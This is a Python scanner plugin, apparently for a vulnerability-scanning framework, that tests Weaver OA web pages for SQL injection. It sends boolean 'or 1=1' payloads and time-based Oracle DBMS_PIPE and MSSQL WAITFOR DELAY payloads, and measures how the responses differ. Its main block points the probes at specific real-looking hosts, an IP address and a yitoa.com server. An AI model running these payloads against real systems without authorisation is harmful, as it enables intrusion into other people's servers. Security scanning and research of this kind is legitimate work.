#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:小光
#refer:http://www.wooyun.org/bugs/wooyun-2015-0136933
#refer:http://www.wooyun.org/bugs/wooyun-2015-0135749

import time
import re

def assign(service, arg):
    if service == 'weaver_oa':
        return True, arg

def audit(arg):
    payload = 'page/element/news/more.jsp?ebaseid=news&eid=-1'
    code1, head, res1, errcode, _ = curl.curl2(arg+payload+'%20or%201%3D1')
    code2, head, res2, errcode, _ = curl.curl2(arg+payload+'%20or%201%3D2')
    m1 = re.findall('</tr>',res1)
    m2 = re.findall('</tr>',res2)
    
    if code1==200 and code2==200 and m1!=m2:
        security_hole(arg + payload + "   :sql Injection")
    else:
        payloads = [
        'page/element/news/more.jsp?ebaseid=news&eid=1123%20AND%208609%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2872%29%7C%7CCHR%28116%29%7C%7CCHR%28117%29%7C%7CCHR%28118%29%2C5%29',
        'page/element/news/more.jsp?ebaseid=news&eid=1123%20WAITFOR%20DELAY%20%270%3A0%3A5%27',
        ]
        for payload1 in payloads:
            payload2 = payload1.replace('5','0')
            t1 = time.time()
            code, head, res, errcode, _ = curl.curl2(arg+payload1)
            t2 = time.time()
            code, head, res, errcode, _ = curl.curl2(arg+payload2)
            t3 = time.time()
            if code == 200 and (2*t2 - t1 - t3 > 3):
                security_hole(arg + payload1 + "   :sql Injection")
    
    payloads = [
        'web/careerapply/HrmCareerApplyPerView.jsp?id=1%20WAITFOR%20DELAY%20%270%3A0%3A5%27',
        'web/careerapply/HrmCareerApplyPerView.jsp?id=1%20AND%208609%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2872%29%7C%7CCHR%28116%29%7C%7CCHR%28117%29%7C%7CCHR%28118%29%2C5%29'
        ]
    for payload1 in payloads:
        payload2 = payload1.replace('5','0')
        t1 = time.time()
        code, head, res, errcode, _ = curl.curl2(arg+payload1)
        t2 = time.time()
        code, head, res, errcode, _ = curl.curl2(arg+payload2)
        t3 = time.time()
        if code == 200 and (2*t2 - t1 - t3 > 3):
            security_hole(arg + payload1 + "   :sql Injection")
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('weaver_oa','http://222.76.205.252:99/')[1])
    audit(assign('weaver_oa','http://oaf.yitoa.com:6688/')[1])
    audit(assign('weaver_oa','http://oaf.yitoa.com:6688/')[1])